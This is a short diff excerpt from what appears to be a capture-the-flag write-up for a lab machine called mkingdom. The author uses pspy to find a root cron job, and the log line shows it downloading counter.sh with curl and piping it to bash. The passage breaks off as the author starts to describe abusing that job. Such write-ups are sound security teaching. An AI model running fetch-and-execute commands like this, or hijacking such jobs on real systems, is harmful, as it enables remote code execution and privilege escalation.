@@ -8,3 +8,7 @@ mario had some privileges and it was /usr/bin/id, quite unconventional.
 
 So, I found something called https://github.com/DominicBreuker/pspy
 and found a routine daemon that 
+```
+2025/08/09 22:41:01 CMD: UID=0     PID=4902   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
+```
+then I tried appe
